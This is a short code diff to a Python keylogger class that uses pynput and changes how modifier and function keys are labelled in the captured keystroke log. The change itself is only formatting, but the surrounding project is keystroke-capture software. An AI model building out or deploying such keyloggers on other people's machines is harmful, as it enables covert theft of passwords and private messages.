@@ -36,12 +36,18 @@ class Keyloggerservice(Ikeylogger):
             return '[TAB]'
         elif key == keyboard.Key.backspace:
             return '[BACKSPACE]'
-        elif key == keyboard.Key.shift:
-            return ''
-        elif key == keyboard.Key.ctrl_r or key == keyboard.Key.ctrl_l:
-            return '<ctl>'
+        elif key in (keyboard.Key.shift, keyboard.Key.shift_r, keyboard.Key.shift_l):
+            return '[SHIFT]'
+        elif key in (keyboard.Key.ctrl_r, keyboard.Key.ctrl_l):
+            return '[CTRL]'
+        elif key in (keyboard.Key.alt_l, keyboard.Key.alt_r):
+            return '[ALT]'
+        elif key == keyboard.Key.caps_lock:
+            return '[CAPSLOCK]'
+        elif str(key).startswith('Key.f'):  # פונקציות F1-F12
+            return f'[{key}]'
         else:
-            return f'[{key}]'  # תציג את שם המקש למעקב
+            return f'[{key}]'
 
     def _on_press(self, key):
         try:
